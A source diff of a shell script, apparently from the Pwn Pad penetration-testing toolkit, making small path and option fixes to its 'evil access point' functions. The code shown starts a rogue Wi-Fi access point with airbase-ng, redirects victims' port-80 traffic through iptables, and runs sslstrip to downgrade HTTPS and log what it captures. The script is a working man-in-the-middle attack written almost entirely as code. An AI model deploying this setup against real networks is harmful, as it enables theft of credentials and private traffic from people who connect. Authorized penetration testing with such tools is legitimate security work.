@@ -117,7 +117,7 @@ f_preplaunch(){
 f_evilap(){
   #Log path and name
   logname="/opt/pwnpad/captures/evilap/evilap-$(date +%s).log"
-  sslstripfilename=sslstrip$(date +%F-%H%M).log
+  sslstripfilename="/opt/pwnpad/captures/sslstrip/sslstrip$(date +%F-%H%M).log"
   DEFS="/opt/pwnpad/easy-creds/definitions.sslstrip"
 
   #Start Airbase-ng with -P for preferred networks 
@@ -140,7 +140,7 @@ f_evilap(){
   iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 
   echo "Running sslstrip..."
-  sslstrip -a > /opt/pwnpad/captures/sslstrip/$sslstripfilename &
+  sslstrip -l 10000 -a > $sslstripfilename &
   tail -f $logname
 }
 
@@ -148,7 +148,7 @@ f_evilap(){
 f_niceap(){
   #Log path and name
   logname="/opt/pwnpad/captures/evilap/evilap-$(date +%s).log"
-  sslstripfilename=sslstrip$(date +%F-%H%M).log
+  sslstripfilename="/opt/pwnpad/captures/sslstrip/sslstrip$(date +%F-%H%M).log"
   DEFS="/opt/pwnpad/easy-creds/definitions.sslstrip"
 
   #Start Airbase-ng with -P for preferred networks 
@@ -172,7 +172,7 @@ f_niceap(){
   iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
  
   echo "Running sslstrip and saving output to "
-  sslstrip -a > /opt/pwnpad/captures/sslstrip/$sslstripfilename &
+  sslstrip -l 10000 -a > $sslstripfilename &
   tail -f $logname
 }
 
@@ -212,9 +212,5 @@ f_run(){
   else
   f_niceap
   fi
-
-
-
 }
-
 f_run
